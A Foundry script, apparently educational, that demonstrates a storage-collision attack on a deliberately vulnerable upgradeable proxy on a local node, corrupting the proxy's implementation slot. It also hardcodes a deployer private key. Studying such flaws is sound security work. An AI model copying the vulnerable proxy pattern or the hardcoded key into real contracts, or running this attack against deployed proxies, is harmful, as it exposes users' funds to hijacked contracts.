// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Script.sol";
import "../../src/vulnerable/BadProxy.sol";
import "../../src/vulnerable/VulnerableLogicV1.sol";
import "../../src/vulnerable/VulnerableLogicV2.sol";

/**
 * @title StorageCollisionDemo
 * @notice Demo: Storage Collision Attack
 * @dev Run: forge script script/demo/StorageCollisionDemo.s.sol --rpc-url http://localhost:8545 --broadcast -vvv
 */
contract StorageCollisionDemo is Script {
    function run() external {
        uint256 deployerKey = 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80;

        console.log("################################################################");
        console.log("#         ATTACK DEMO: STORAGE COLLISION                      #");
        console.log("################################################################");

        vm.startBroadcast(deployerKey);

        // Setup
        console.log("\n=== SETUP ===");
        console.log("Deploy BadProxy with VulnerableLogicV1");
        VulnerableLogicV1 implV1 = new VulnerableLogicV1();
        BadProxy proxy = new BadProxy(address(implV1));
        console.log("BadProxy:", address(proxy));
        console.log("Implementation (slot 0):", proxy.implementation());

        // Attack Step 1
        console.log("\n=== ATTACK STEP 1: UPGRADE ===");
        VulnerableLogicV2 implV2 = new VulnerableLogicV2();
        proxy.upgradeTo(address(implV2));
        console.log("Upgraded to:", proxy.implementation());

        // Attack Step 2
        console.log("\n=== ATTACK STEP 2: TRIGGER COLLISION ===");
        console.log("Calling setCollisionVar(9999)...");
        VulnerableLogicV2(address(proxy)).setCollisionVar(9999);

        // Result
        console.log("\n=== RESULT ===");
        address corrupted = proxy.implementation();
        console.log("Implementation NOW:", corrupted);
        console.log("Expected:", address(implV2));

        vm.stopBroadcast();

        console.log("\n*** ATTACK SUCCESS: Proxy corrupted! ***");
    }
}
